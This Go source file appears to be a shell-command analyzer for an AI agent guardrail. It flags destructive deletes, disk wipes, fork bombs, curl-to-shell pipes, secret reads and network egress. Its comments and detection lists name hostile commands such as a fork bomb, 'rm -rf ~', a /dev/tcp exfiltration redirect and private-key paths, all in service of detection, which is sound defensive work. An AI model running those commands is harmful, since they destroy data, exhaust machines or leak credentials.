// Package shell performs semantic analysis of shell commands.
//
// Unlike substring or regexp denylists, the analyzer parses the command into a
// real shell AST (via mvdan.cc/sh) and reasons about *intent*. That means
// `rm -rf ~`, `rm -fr ~`, `rm -f -r ~` and `sudo rm -rf $HOME` are all
// recognised as the same dangerous operation, while `rm -rf node_modules` is
// correctly treated as harmless. Keeping false positives near zero is the whole
// point: a guardrail that cries wolf gets uninstalled.
package shell

import (
	"path/filepath"
	"regexp"
	"strings"

	"mvdan.cc/sh/v3/syntax"
)

// DeleteTarget classifies how sensitive a path location is. It is named for its
// first use (recursive deletes) but is a generic path-severity scale reused by
// other detectors (e.g. chmod).
type DeleteTarget int

const (
	// TargetNone means no target was found.
	TargetNone DeleteTarget = iota
	// TargetCwdRelative is a path inside the current workspace (e.g. ./dist,
	// node_modules, *). These are everyday operations and must not be blocked.
	TargetCwdRelative
	// TargetOutsideWorkspace is a path that escapes the workspace but is not a
	// well-known sensitive root (e.g. ~/.cache/foo, /tmp/x, ../sibling).
	TargetOutsideWorkspace
	// TargetSensitive is a home/root/system root (~, $HOME, /, /*). Touching
	// these destructively is almost never intentional from an agent.
	TargetSensitive
)

func (t DeleteTarget) String() string {
	switch t {
	case TargetCwdRelative:
		return "cwd_relative"
	case TargetOutsideWorkspace:
		return "outside_workspace"
	case TargetSensitive:
		return "sensitive"
	default:
		return "none"
	}
}

// SecretConfidence rates how likely a referenced path holds secret material.
type SecretConfidence int

const (
	// SecretNone means no secret material was referenced.
	SecretNone SecretConfidence = iota
	// SecretEnv is a .env-style file: often holds secrets, but is also routinely
	// read by legitimate tooling, so it warrants a prompt rather than a block.
	SecretEnv
	// SecretHigh is private-key or cloud-credential material; exfiltrating it is
	// almost never legitimate.
	SecretHigh
)

func (c SecretConfidence) String() string {
	switch c {
	case SecretEnv:
		return "env"
	case SecretHigh:
		return "high"
	default:
		return "none"
	}
}

// Analysis is the set of semantic facts extracted from a shell command. Rules
// match against these facts rather than against raw text.
type Analysis struct {
	// Parsed is false when the command could not be parsed as shell. Callers
	// should treat an unparsed command conservatively (the engine falls back to
	// regexp rules and the default effect).
	Parsed bool

	// Commands is the de-duplicated set of effective command names invoked,
	// after unwrapping prefixes like sudo/env/command.
	Commands []string

	// RecursiveDelete is true when an `rm` invocation carries a recursive flag.
	RecursiveDelete bool
	// Forced is true when an `rm` invocation carries -f/--force.
	Forced bool
	// DeleteTarget is the most severe target classification across all rm
	// operands in the command.
	DeleteTarget DeleteTarget

	// ChmodWorldWritable is true when a chmod grants write permission to
	// "others" (e.g. 777, 666, o+w, a+w).
	ChmodWorldWritable bool
	// ChmodTarget is the most severe target classification across the operands
	// of a world-writable chmod.
	ChmodTarget DeleteTarget

	// BlockDeviceWrite is true when a command writes destructively to a raw
	// disk / block device: `dd of=/dev/sdX`, `mkfs` on a device, or a shell
	// redirect to one. Pseudo-devices (/dev/null, /dev/zero, /dev/stdout) and
	// regular image files never count, so cloning to an .img is not flagged.
	BlockDeviceWrite bool

	// ForcePush is true for `git push --force`/`-f` (but not --force-with-lease).
	ForcePush bool
	// HistoryRewrite is true for irreversibly destructive git operations such as
	// `git reset --hard` and `git clean -fd`.
	HistoryRewrite bool

	// PipeToShellFromNet is true when a network fetch is piped straight into a
	// shell or interpreter (curl ... | sh).
	PipeToShellFromNet bool

	// ForkBomb is true when a function definition pipes into itself on both
	// sides (`:(){ :|:& };:` plus renamed, spaced, and `&`-less variants) — the
	// self-replicating shape that exhausts the machine.
	ForkBomb bool

	// SecretRead is the highest-confidence secret reference seen in the command
	// (e.g. a private key, cloud credential, or .env file being read).
	SecretRead SecretConfidence
	// NetEgress is true when the command routes data out to the network: a
	// curl/wget upload, nc connecting out, or a bash /dev/tcp redirect.
	NetEgress bool

	// SecretDump is the highest-confidence secret whose *contents* a
	// content-reading command (cat, head, base64, xxd, …) surfaces to stdout —
	// and thus into the agent's context. Unlike SecretRead it is not set by
	// commands that merely name the path (chmod, ls, cp), and it ignores .env.
	SecretDump SecretConfidence

	// NonRegistryInstall is true when a package manager (npm/yarn/pnpm/bun/pip)
	// is asked to install from a non-registry source — a git spec, URL, or local
	// archive — which runs that package's install scripts and skips registry
	// review. Plain registry installs (`npm install lodash`) never count.
	NonRegistryInstall bool

	// PersistenceInstall is true when a command installs a scheduled or
	// auto-start job that runs later — a crontab install, `launchctl
	// load`/`bootstrap`, or `systemctl enable`. Read-only forms (`crontab -l`,
	// `launchctl list`) never count.
	PersistenceInstall bool

	// Raw is the original command text.
	Raw string
}

// Has reports whether the command invokes any of the named commands.
func (a Analysis) Has(names ...string) bool {
	for _, want := range names {
		for _, got := range a.Commands {
			if got == want {
				return true
			}
		}
	}
	return false
}

var (
	commandPrefixes = map[string]bool{
		"sudo": true, "doas": true, "env": true, "command": true,
		"nice": true, "ionice": true, "nohup": true, "stdbuf": true,
	}
	networkFetchers   = map[string]bool{"curl": true, "wget": true, "fetch": true, "http": true, "https": true, "httpie": true}
	shellInterpreters = map[string]bool{
		"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true, "fish": true,
		"python": true, "python3": true, "node": true, "nodejs": true, "ruby": true,
		"perl": true, "php": true,
	}
	// secretReaders dump a file's contents to stdout. An agent running one of
	// these on key/credential material pipes the secret straight into its own
	// context. Commands that only reference a path (chmod, ls, cp, mv, stat) are
	// deliberately absent — they disclose nothing.
	secretReaders = map[string]bool{
		"cat": true, "tac": true, "nl": true,
		"head": true, "tail": true,
		"less": true, "more": true, "most": true,
		"base64": true, "base32": true,
		"xxd": true, "od": true, "hexdump": true, "hd": true,
		"strings": true,
	}
	// installValueFlags are package-manager flags whose following token is a
	// config value (an index/registry URL, a links dir, a requirements file, a
	// target dir) rather than a package source — so that value must not be
	// mistaken for an install source. `-e`/`--editable` is deliberately absent:
	// its value *is* a source (`pip install -e git+https://…`).
	installValueFlags = map[string]bool{
		// pip
		"-i": true, "--index-url": true, "--extra-index-url": true,
		"-f": true, "--find-links": true, "-c": true, "--constraint": true,
		"-r": true, "--requirement": true, "-t": true, "--target": true,
		"--cache-dir": true, "--src": true, "--root": true, "--prefix": true,
		// npm / yarn / pnpm
		"--registry": true, "--cache": true, "--userconfig": true,
		"--globalconfig": true, "--tag": true, "--otp": true,
		"--dir": true, "-C": true, "--workspace": true, "-w": true,
	}
)

// Analyze parses command and extracts semantic facts. cwd is used to decide
// whether a delete target is inside the workspace; if empty, paths that are not
// obviously sensitive are treated as outside the workspace.
func Analyze(command, cwd string) Analysis {
	a := Analysis{Raw: command}

	parser := syntax.NewParser()
	file, err := parser.Parse(strings.NewReader(command), "")
	if err != nil {
		a.Parsed = false
		return a
	}
	a.Parsed = true

	seen := map[string]bool{}

	syntax.Walk(file, func(node syntax.Node) bool {
		switch n := node.(type) {
		case *syntax.CallExpr:
			// Scan every word for secret references and raw /dev/tcp egress
			// targets, independent of the command name.
			for _, w := range n.Args {
				txt, _ := wordToString(w)
				if c := classifySecret(txt); c > a.SecretRead {
					a.SecretRead = c
				}
				if isDevNet(txt) {
					a.NetEgress = true
				}
			}
			name, args := resolveCommand(n)
			if name == "" {
				return true
			}
			if !seen[name] {
				seen[name] = true
				a.Commands = append(a.Commands, name)
			}
			a.inspectCommand(name, args, cwd)
			if isNetEgressCommand(name, args) {
				a.NetEgress = true
			}
		case *syntax.Redirect:
			// A redirect target can open a network socket (`> /dev/tcp/host/port`)
			// or write onto a raw disk (`cat img > /dev/sda`).
			if n.Word != nil {
				txt, _ := wordToString(n.Word)
				if isDevNet(txt) {
					a.NetEgress = true
				}
				if isOutputRedirect(n.Op) && isBlockDevice(txt) {
					a.BlockDeviceWrite = true
				}
			}
		case *syntax.BinaryCmd:
			if n.Op == syntax.Pipe || n.Op == syntax.PipeAll {
				if isNetToShellPipe(n) {
					a.PipeToShellFromNet = true
				}
			}
		case *syntax.FuncDecl:
			if isForkBomb(n) {
				a.ForkBomb = true
			}
		}
		return true
	})

	return a
}

func (a *Analysis) inspectCommand(name string, args []string, cwd string) {
	switch name {
	case "rm":
		recursive, forced, operands := parseRmFlags(args)
		if recursive {
			a.RecursiveDelete = true
		}
		if forced {
			a.Forced = true
		}
		if recursive {
			for _, op := range operands {
				if t := classifyTarget(op, cwd); t > a.DeleteTarget {
					a.DeleteTarget = t
				}
			}
		}
	case "chmod":
		if world, paths := parseChmod(args); world {
			a.ChmodWorldWritable = true
			for _, p := range paths {
				if t := classifyTarget(p, cwd); t > a.ChmodTarget {
					a.ChmodTarget = t
				}
			}
		}
	case "git":
		a.inspectGit(args)
	case "dd":
		// dd writes to the file named by its `of=` operand. Flag only when that
		// target is a real block device — never /dev/null, /dev/zero, or a
		// regular image file (cloning a disk *to* a file is safe).
		for _, arg := range args {
			if dev, ok := strings.CutPrefix(arg, "of="); ok && isBlockDevice(dev) {
				a.BlockDeviceWrite = true
			}
		}
	case "crontab":
		if crontabInstalls(args) {
			a.PersistenceInstall = true
		}
	case "launchctl":
		switch firstNonFlag(args) {
		case "load", "bootstrap":
			a.PersistenceInstall = true
		}
	case "systemctl":
		if firstNonFlag(args) == "enable" {
			a.PersistenceInstall = true
		}
	}
	// mkfs / mkfs.<fstype> formats whichever device path it is handed; making a
	// filesystem in an image file (a non-/dev path) is left alone.
	if name == "mkfs" || strings.HasPrefix(name, "mkfs.") {
		for _, arg := range args {
			if !strings.HasPrefix(arg, "-") && isBlockDevice(arg) {
				a.BlockDeviceWrite = true
			}
		}
	}
	// A content-reading command (cat, head, base64, …) whose operand is secret
	// material dumps that secret into the agent's context.
	if secretReaders[name] {
		for _, arg := range args {
			if strings.HasPrefix(arg, "-") {
				continue // option flag, not a path operand
			}
			if c := classifySecret(arg); c > a.SecretDump {
				a.SecretDump = c
			}
		}
	}
	a.inspectInstall(name, args)
}

func (a *Analysis) inspectGit(args []string) {
	// Find the git subcommand (first non-flag, non-global-option token).
	sub := ""
	rest := []string{}
	for i := 0; i < len(args); i++ {
		arg := args[i]
		if sub == "" {
			if strings.HasPrefix(arg, "-") {
				continue // global option like -C <path>; ignored for v0
			}
			sub = arg
			rest = args[i+1:]
			break
		}
	}
	switch sub {
	case "push":
		for _, f := range rest {
			if f == "--force" || f == "-f" {
				a.ForcePush = true
			}
		}
	case "reset":
		for _, f := range rest {
			if f == "--hard" {
				a.HistoryRewrite = true
			}
		}
	case "clean":
		forced, removesDirs := false, false
		for _, f := range rest {
			if strings.HasPrefix(f, "--") {
				switch f {
				case "--force":
					forced = true
				}
				continue
			}
			if strings.HasPrefix(f, "-") {
				for _, c := range f[1:] {
					switch c {
					case 'f':
						forced = true
					case 'd', 'x', 'X':
						removesDirs = true
					}
				}
			}
		}
		if forced && removesDirs {
			a.HistoryRewrite = true
		}
	}
}

// inspectInstall flags installing a package from a non-registry source (a git
// spec, URL, or local archive), across npm/yarn/pnpm/bun and pip (including
// `python -m pip install`). Registry installs like `npm install lodash` or
// `pip install -r requirements.txt` are left alone.
func (a *Analysis) inspectInstall(name string, args []string) {
	rest, ok := installArgs(name, args)
	if !ok {
		return
	}
	skipNext := false
	for _, arg := range rest {
		if skipNext {
			skipNext = false
			continue
		}
		if strings.HasPrefix(arg, "-") {
			if installValueFlags[arg] {
				skipNext = true // its value is config (an index/dir/file), not a source
			}
			continue
		}
		if isNonRegistrySource(arg) {
			a.NonRegistryInstall = true
		}
	}
}

// installArgs reports whether name+args is a package-install invocation and, if
// so, returns the tokens following the install subcommand.
func installArgs(name string, args []string) ([]string, bool) {
	switch name {
	case "npm", "pnpm", "bun":
		return afterSubcommand(args, "install", "i", "add")
	case "yarn":
		return afterSubcommand(args, "add")
	case "pip", "pip2", "pip3":
		return afterSubcommand(args, "install")
	case "python", "python3", "python2":
		// python -m pip install ...
		if len(args) >= 2 && args[0] == "-m" && args[1] == "pip" {
			return afterSubcommand(args[2:], "install")
		}
	}
	return nil, false
}

// afterSubcommand returns the tokens after the first non-flag token when that
// token is one of subs; otherwise it reports false. Flags preceding the
// subcommand (e.g. `npm --loglevel=warn install`) are skipped.
func afterSubcommand(args []string, subs ...string) ([]string, bool) {
	for i, arg := range args {
		if strings.HasPrefix(arg, "-") {
			continue
		}
		for _, s := range subs {
			if arg == s {
				return args[i+1:], true
			}
		}
		return nil, false // first non-flag token is not an install subcommand
	}
	return nil, false
}

// isNonRegistrySource reports whether an install operand names a non-registry
// source — a VCS spec, a hosting shorthand, a file: URL, or a source archive.
// Plain registry names (`lodash`, `@scope/pkg`, `django==4.2`) return false, and
// bare index/registry URLs never reach here as sources (inspectInstall skips
// them as flag values).
func isNonRegistrySource(arg string) bool {
	s := strings.TrimSpace(arg)
	if s == "" {
		return false
	}
	// Version-control specs.
	if strings.HasPrefix(s, "git+") || strings.HasPrefix(s, "git://") || strings.HasPrefix(s, "git@") {
		return true
	}
	// Hosting shorthands (npm) and the file: protocol.
	for _, p := range []string{"github:", "gitlab:", "bitbucket:", "gist:", "file:"} {
		if strings.HasPrefix(s, p) {
			return true
		}
	}
	// A source archive, local or remote (pkg.tgz, x.tar.gz, y.whl, …).
	return hasArchiveExt(s)
}

func hasArchiveExt(s string) bool {
	// Drop any URL query/fragment before checking the extension.
	if i := strings.IndexAny(s, "?#"); i >= 0 {
		s = s[:i]
	}
	for _, ext := range []string{".tgz", ".tar.gz", ".tar.bz2", ".tar.xz", ".tar", ".whl", ".zip"} {
		if strings.HasSuffix(s, ext) {
			return true
		}
	}
	return false
}

// firstNonFlag returns the first argument that is not an option flag — a
// command's subcommand (e.g. `enable` in `systemctl --user enable x`).
func firstNonFlag(args []string) string {
	for _, arg := range args {
		if !strings.HasPrefix(arg, "-") {
			return arg
		}
	}
	return ""
}

// crontabInstalls reports whether a crontab invocation *installs* a crontab —
// from a file operand or stdin (`-`) — rather than listing (`-l`), editing
// interactively (`-e`), or removing it (`-r`). Installing schedules code to run
// later, a persistence vector; listing is read-only.
func crontabInstalls(args []string) bool {
	install, list := false, false
	skipNext := false
	for _, arg := range args {
		if skipNext {
			skipNext = false
			continue
		}
		switch arg {
		case "-l":
			list = true
		case "-u":
			skipNext = true // its value is a username, not a file
		case "-r", "-e", "-i":
			// operation flags that do not install from a file
		case "-":
			install = true // read the new crontab from stdin
		default:
			if !strings.HasPrefix(arg, "-") {
				install = true // a file operand installs a crontab
			}
		}
	}
	return install && !list
}

// resolveCommand returns the effective command name and its arguments, peeling
// off prefixes like `sudo`, `env FOO=bar`, and `command`.
func resolveCommand(call *syntax.CallExpr) (string, []string) {
	words := make([]string, 0, len(call.Args))
	for _, w := range call.Args {
		s, _ := wordToString(w)
		words = append(words, s)
	}
	for len(words) > 0 {
		head := words[0]
		// env-style leading VAR=value assignments.
		if strings.Contains(head, "=") && !strings.HasPrefix(head, "-") && isAssignment(head) {
			words = words[1:]
			continue
		}
		if commandPrefixes[head] {
			words = words[1:]
			// skip options that belong to the prefix (e.g. sudo -u user)
			for len(words) > 0 && strings.HasPrefix(words[0], "-") {
				words = words[1:]
			}
			continue
		}
		break
	}
	if len(words) == 0 {
		return "", nil
	}
	return baseName(words[0]), words[1:]
}

func isAssignment(s string) bool {
	eq := strings.IndexByte(s, '=')
	if eq <= 0 {
		return false
	}
	for i, r := range s[:eq] {
		if r == '_' || (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') {
			continue
		}
		if i > 0 && r >= '0' && r <= '9' {
			continue
		}
		return false
	}
	return true
}

func baseName(cmd string) string {
	// Normalise an absolute/relative path to its base (/bin/rm -> rm).
	if i := strings.LastIndexByte(cmd, '/'); i >= 0 {
		return cmd[i+1:]
	}
	return cmd
}

// parseRmFlags splits rm arguments into flags and operands, handling combined
// short flags (-rf), separate flags (-r -f), long flags, and the -- terminator.
func parseRmFlags(args []string) (recursive, forced bool, operands []string) {
	flagsDone := false
	for _, arg := range args {
		switch {
		case flagsDone:
			operands = append(operands, arg)
		case arg == "--":
			flagsDone = true
		case strings.HasPrefix(arg, "--"):
			switch arg {
			case "--recursive":
				recursive = true
			case "--force":
				forced = true
			}
		case strings.HasPrefix(arg, "-") && len(arg) > 1:
			for _, c := range arg[1:] {
				switch c {
				case 'r', 'R':
					recursive = true
				case 'f':
					forced = true
				}
			}
		default:
			operands = append(operands, arg)
		}
	}
	return recursive, forced, operands
}

// parseChmod splits chmod arguments into the mode and its target paths, then
// reports whether the mode grants world-write. The mode is the first non-option
// token; `--reference=FILE` copies a mode from elsewhere and is treated as not
// world-writable (nothing to classify).
func parseChmod(args []string) (world bool, paths []string) {
	mode := ""
	sawMode := false
	for _, arg := range args {
		if !sawMode {
			switch {
			case arg == "--":
				continue
			case strings.HasPrefix(arg, "--reference"):
				return false, nil
			case strings.HasPrefix(arg, "--"):
				continue // long option (--recursive, --verbose, ...)
			case strings.HasPrefix(arg, "-") && len(arg) > 1 && !isRemovalMode(arg):
				continue // short option flags (-R, -Rv, -v, ...)
			}
			mode = arg
			sawMode = true
			continue
		}
		paths = append(paths, arg)
	}
	if !sawMode {
		return false, nil
	}
	return chmodWorldWritable(mode), paths
}

// isRemovalMode reports whether a `-`-prefixed token is a symbolic *mode* that
// removes permissions (e.g. `-w`, `-rx`) rather than an option flag (`-R`).
// Removal modes never grant world-write, but they must not be skipped as flags.
func isRemovalMode(arg string) bool {
	if len(arg) < 2 || arg[0] != '-' {
		return false
	}
	for _, c := range arg[1:] {
		if !strings.ContainsRune("rwxXst", c) {
			return false
		}
	}
	return true
}

// chmodWorldWritable reports whether a chmod mode grants write to "others".
func chmodWorldWritable(mode string) bool {
	if mode == "" {
		return false
	}
	if isOctalMode(mode) {
		// The last octal digit is the "others" class; the write bit is 2.
		last := mode[len(mode)-1] - '0'
		return last&2 != 0
	}
	for _, clause := range strings.Split(mode, ",") {
		if symbolicGrantsWorldWrite(clause) {
			return true
		}
	}
	return false
}

func isOctalMode(s string) bool {
	if s == "" || len(s) > 4 {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '7' {
			return false
		}
	}
	return true
}

// symbolicGrantsWorldWrite reports whether a single symbolic clause (e.g.
// `o+w`, `a+rwx`, `+w`) adds write permission for others or all.
func symbolicGrantsWorldWrite(clause string) bool {
	i := strings.IndexAny(clause, "+-=")
	if i < 0 {
		return false
	}
	who, op, perms := clause[:i], clause[i], clause[i+1:]
	if op == '-' { // removing permissions
		return false
	}
	if !strings.ContainsRune(perms, 'w') {
		return false
	}
	// An empty "who" means all (a); otherwise it must include others or all.
	return who == "" || strings.ContainsRune(who, 'o') || strings.ContainsRune(who, 'a')
}

// classifyTarget decides how sensitive a single path operand is.
func classifyTarget(target, cwd string) DeleteTarget {
	t := strings.TrimSpace(target)
	if t == "" {
		return TargetNone
	}
	// Strip a single trailing slash for comparison, but remember it existed.
	bare := strings.TrimSuffix(t, "/")

	// Root and "everything under root".
	switch bare {
	case "/", "/*":
		return TargetSensitive
	}
	if t == "/" || t == "/*" {
		return TargetSensitive
	}

	// Home root, in tilde or $HOME form, optionally with a trailing /* .
	homeRoots := map[string]bool{
		"~": true, "~/*": true,
		"$HOME": true, "${HOME}": true, "$HOME/*": true, "${HOME}/*": true,
		"$home": true,
	}
	if homeRoots[bare] || homeRoots[t] {
		return TargetSensitive
	}

	// A path *under* home (e.g. ~/.cache, $HOME/work) — escapes the workspace.
	if strings.HasPrefix(t, "~/") || strings.HasPrefix(t, "$HOME/") || strings.HasPrefix(t, "${HOME}/") {
		return TargetOutsideWorkspace
	}

	// Absolute paths: inside cwd is workspace-relative, otherwise outside.
	if strings.HasPrefix(t, "/") {
		if cwd != "" {
			if rel, err := filepath.Rel(cwd, t); err == nil && rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
				return TargetCwdRelative
			}
		}
		return TargetOutsideWorkspace
	}

	// Unresolved variable expansion we can't reason about — be cautious but not
	// alarmist: ask rather than deny.
	if strings.Contains(t, "$") {
		return TargetOutsideWorkspace
	}

	// Escaping the workspace upward.
	if t == ".." || strings.HasPrefix(t, "../") {
		return TargetOutsideWorkspace
	}

	// Everything else (., ./build, node_modules, *, dist/) is workspace-local.
	return TargetCwdRelative
}

// isNetToShellPipe reports whether a pipeline routes a network fetcher into a
// shell interpreter, e.g. `curl https://x | sh`. The fetcher and the shell need
// not be adjacent: `curl https://x | tail -n5 | sh` is caught too, because
// inserting a passthrough filter is a common way to dodge naive curl|sh checks.
func isNetToShellPipe(pipe *syntax.BinaryCmd) bool {
	stages := pipelineStages(pipe.X)
	stages = append(stages, pipelineStages(pipe.Y)...)

	seenNet := false
	for _, name := range stages {
		if seenNet && shellInterpreters[name] {
			return true
		}
		if networkFetchers[name] {
			seenNet = true
		}
	}
	return false
}

// pipelineStages flattens a pipe chain into the ordered command names of its
// stages. Non-pipe statements contribute a single stage (their command name, or
// "" if it has none, to preserve ordering).
func pipelineStages(stmt *syntax.Stmt) []string {
	if stmt == nil {
		return nil
	}
	if bc, ok := stmt.Cmd.(*syntax.BinaryCmd); ok && (bc.Op == syntax.Pipe || bc.Op == syntax.PipeAll) {
		return append(pipelineStages(bc.X), pipelineStages(bc.Y)...)
	}
	return []string{commandNameOfStmt(stmt)}
}

func commandNameOfStmt(stmt *syntax.Stmt) string {
	if stmt == nil {
		return ""
	}
	if call, ok := stmt.Cmd.(*syntax.CallExpr); ok {
		name, _ := resolveCommand(call)
		return name
	}
	return ""
}

// isForkBomb reports whether a function definition is a fork bomb: its body
// contains a pipeline that calls the function's own name on both sides — the
// canonical `:(){ :|:& };:` plus renamed, spaced, and `&`-less variants such as
// `bomb(){ bomb|bomb& }` or `:(){ :|:; }`. Every invocation spawns two or more
// of itself, so processes multiply exponentially and exhaust the machine.
// Detecting the definition (rather than the trailing trigger call) also catches
// define-now/run-later forms the old literal regex missed.
//
// The signature is the *self-pipe*: a pipeline with two or more stages that call
// the function itself. The background `&` is incidental (it merely makes each
// invocation return sooner), so it is not required. Requiring two self-calls is
// what keeps false positives out — ordinary recursion (`f(){ f; }`) has no pipe,
// and a tail-recursive stream (`f(){ cmd | f; }`) calls itself only once.
func isForkBomb(fn *syntax.FuncDecl) bool {
	if fn.Name == nil || fn.Body == nil {
		return false
	}
	name := fn.Name.Value
	found := false
	syntax.Walk(fn.Body, func(node syntax.Node) bool {
		bc, ok := node.(*syntax.BinaryCmd)
		if !ok || (bc.Op != syntax.Pipe && bc.Op != syntax.PipeAll) {
			return true
		}
		selfCalls := 0
		for _, stage := range pipelineStages(&syntax.Stmt{Cmd: bc}) {
			if stage == name {
				selfCalls++
			}
		}
		if selfCalls >= 2 {
			found = true
			return false
		}
		return true
	})
	return found
}

// classifySecret rates a single command word that may reference secret
// material. It understands curl's "@file" data syntax, ~ / $HOME prefixes, and
// flags that glue the path on with '=' (e.g. --post-file=.env).
func classifySecret(word string) SecretConfidence {
	s := strings.TrimSpace(word)
	if s == "" {
		return SecretNone
	}
	best := classifySecretPath(s)
	if i := strings.LastIndexByte(s, '='); i >= 0 {
		if c := classifySecretPath(s[i+1:]); c > best {
			best = c
		}
	}
	return best
}

func classifySecretPath(s string) SecretConfidence {
	s = strings.TrimPrefix(strings.TrimSpace(s), "@") // curl --data @file / -T @file
	if s == "" {
		return SecretNone
	}
	base := s
	if i := strings.LastIndexByte(base, '/'); i >= 0 {
		base = base[i+1:]
	}
	if strings.HasSuffix(base, ".pub") { // public keys are not secret
		return SecretNone
	}
	switch base {
	case "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519":
		return SecretHigh
	}
	if strings.HasSuffix(base, ".pem") || strings.HasSuffix(base, ".key") {
		return SecretHigh
	}
	if strings.Contains(s, ".aws/credentials") ||
		strings.Contains(s, ".config/gcloud") ||
		strings.Contains(s, ".kube/config") {
		return SecretHigh
	}
	if strings.Contains(s, ".ssh/") && strings.HasPrefix(base, "id_") {
		return SecretHigh
	}
	if base == ".env" || strings.HasPrefix(base, ".env.") {
		return SecretEnv
	}
	return SecretNone
}

// isNetEgressCommand reports whether a command sends local data out to the
// network. It is deliberately tight: curl/wget only count when they carry an
// upload flag (a plain GET does not exfiltrate anything), and nc only when it is
// connecting out rather than listening.
func isNetEgressCommand(name string, args []string) bool {
	switch name {
	case "curl", "wget":
		return hasUploadFlag(args)
	case "nc", "ncat", "netcat":
		return !hasListenFlag(args)
	}
	return false
}

func hasUploadFlag(args []string) bool {
	for _, a := range args {
		switch {
		case strings.HasPrefix(a, "--data"), // curl --data, --data-binary
			strings.HasPrefix(a, "--form"), // curl --form, --form-string
			strings.HasPrefix(a, "--post"), // wget --post-data, --post-file
			strings.HasPrefix(a, "--body"), // wget --body-data, --body-file
			a == "--upload-file":
			return true
		case len(a) >= 2 && a[0] == '-' && a[1] != '-':
			// Short flags, optionally glued to a value (-d@file, -Tfile). curl's
			// -d/-F/-T carry the payload, so they lead the option string.
			switch a[1] {
			case 'd', 'F', 'T':
				return true
			}
		}
	}
	return false
}

func hasListenFlag(args []string) bool {
	for _, a := range args {
		if a == "--listen" {
			return true
		}
		if len(a) >= 2 && a[0] == '-' && a[1] != '-' && strings.ContainsRune(a, 'l') {
			return true
		}
	}
	return false
}

// isDevNet reports whether a word is a bash /dev/tcp or /dev/udp pseudo-device,
// used to open a raw network connection (e.g. `cat secret > /dev/tcp/host/port`).
func isDevNet(word string) bool {
	return strings.Contains(word, "/dev/tcp/") || strings.Contains(word, "/dev/udp/")
}

// blockDeviceRe matches a raw disk or partition node under /dev — the kind of
// target a destructive dd/mkfs write (or redirect) would irreversibly wipe. It
// spans Linux (sd/hd/vd/xvd disks, nvme, mmcblk) and macOS (disk/rdisk).
// Pseudo-devices such as /dev/null, /dev/zero, /dev/random and /dev/stdout
// deliberately do NOT match, so writing to a bit bucket or an image file is
// never flagged.
var blockDeviceRe = regexp.MustCompile(`^/dev/(` +
	`(s|h|v|xv)d[a-z]+[0-9]*` + // sda, sdb1, hda, vda, xvda2
	`|nvme[0-9]+n[0-9]+(p[0-9]+)?` + // nvme0n1, nvme0n1p2
	`|mmcblk[0-9]+(p[0-9]+)?` + // mmcblk0, mmcblk0p1
	`|r?disk[0-9]+(s[0-9]+)*` + // macOS disk2, rdisk2, disk0s1
	`)$`)

// isBlockDevice reports whether path names a raw disk / block-device node that a
// destructive write would wipe. The word is already resolved from the AST (a dd
// `of=` value, an mkfs operand, or a redirect target), so this is a semantic
// classification of that path — not a substring scan of the raw command.
func isBlockDevice(path string) bool {
	return blockDeviceRe.MatchString(strings.TrimSpace(path))
}

// isOutputRedirect reports whether a redirect operator writes to its target
// (`>`, `>>`, `>|`, `&>`, `&>>`) rather than reading from it. Input and
// here-doc redirects can never wipe a device, so they are excluded.
func isOutputRedirect(op syntax.RedirOperator) bool {
	switch op {
	case syntax.RdrOut, syntax.AppOut, syntax.ClbOut, syntax.RdrAll, syntax.AppAll:
		return true
	}
	return false
}

// wordToString reconstructs the textual value of a word. Parameter expansions
// are rendered in $NAME form (so $HOME stays recognisable) and the second
// return value reports whether any expansion was present.
func wordToString(w *syntax.Word) (string, bool) {
	var b strings.Builder
	expanded := false
	for _, part := range w.Parts {
		switch p := part.(type) {
		case *syntax.Lit:
			b.WriteString(p.Value)
		case *syntax.SglQuoted:
			b.WriteString(p.Value)
		case *syntax.DblQuoted:
			for _, inner := range p.Parts {
				switch ip := inner.(type) {
				case *syntax.Lit:
					b.WriteString(ip.Value)
				case *syntax.ParamExp:
					expanded = true
					if ip.Param != nil {
						b.WriteString("$" + ip.Param.Value)
					}
				}
			}
		case *syntax.ParamExp:
			expanded = true
			if p.Param != nil {
				b.WriteString("$" + p.Param.Value)
			}
		default:
			expanded = true
		}
	}
	return b.String(), expanded
}
